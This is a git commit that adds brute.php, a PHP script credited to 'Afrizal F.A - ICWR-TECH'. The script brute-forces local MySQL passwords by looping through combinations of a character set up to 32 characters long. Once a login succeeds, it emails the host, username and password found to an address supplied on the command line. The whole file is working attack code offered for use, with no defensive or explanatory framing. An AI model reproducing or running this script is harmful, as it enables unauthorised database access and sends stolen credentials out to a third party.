a094972ecafe000851e4dfac7b7695e6b0501d25
Afrizal F.A <42967700+Afrizall@users.noreply.github.com>
2019-05-25 19:44:45 +0700

    Create brute.php

---
+++ brute.php
@@ -0,0 +1,32 @@
+<?php
+// Local Mysql Brute Force With Send Mail
+// Coded By Afrizal F.A - ICWR-TECH
+error_reporting(0);
+$user=$argv[1];
+$mail=$argv[2];
+$host="localhost";
+$port=21;
+$charset="aiueobcdfghjklmnpqrstvwxyzAIUEO1234567890#@!";
+$p=strlen($charset);
+echo "[+] MYSQL Brute Force Running\n";
+function brute_mysql($host,$port,$user,$pass,$mail) {
+  if(mysqli_connect($host,$user,$pass,"information_schema")) {
+    $res = "Host : ".$_SERVER['HTTP_HOST']." | Username : $user | Password : $pass";
+    mail($mail,"Mysql Password Brute Force ( ".$_SERVER['HTTP_HOST']." )",$res);
+    exit;
+  }
+}
+function crunch($a,$b,$c,$mail){
+	global $charset,$p,$xx,$host,$port,$user;
+	for($i=0;$i < $p;$i++){
+		if($a > $b-1){
+			crunch($a, $b+1, $c.$charset[$i],$mail);
+		}
+		$xx=$c.$charset[$i];
+    echo "\r[*] Attempt : $xx ( False )";
+    brute_mysql($host,$port,$user,$xx,$mail);
+	}
+}
+for($x=1;$x<32+1;$x++){
+		crunch("$x","0","",$mail);
+}
